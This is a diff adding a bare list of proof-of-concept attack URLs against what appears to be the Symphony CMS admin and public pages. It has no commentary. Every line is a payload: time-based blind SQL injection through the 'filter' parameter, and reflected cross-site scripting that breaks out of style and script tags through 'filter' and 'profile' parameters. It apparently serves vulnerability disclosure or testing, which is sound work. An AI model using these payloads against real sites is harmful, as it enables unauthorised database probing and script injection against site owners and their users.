@@ -1,0 +1,13 @@
+http://example.com/symphony/publish/comments/?filter='+(SELECT+1+FROM+(SELECT+SLEEP(25))A)+'
+
+http://example.com/symphony/publish/images/?filter='+(SELECT+1+FROM+(SELECT+SLEEP(25))A)+'
+ 
+http://example.com/?profile='"--></style></script><script>alert(1)</script>
+
+http://example.com/symphony/publish/comments/?filter='"--></style></script><script>alert(1)</script>
+
+http://example.com/symphony/publish/images/?filter='"--></style></script><script>alert(1)</script>
+
+http://example.com/about/?profile='"--></style></script><script>alert(1)</script>
+
+http://example.com/drafts/?profile='"--></style></script><script>alert(1)</script>
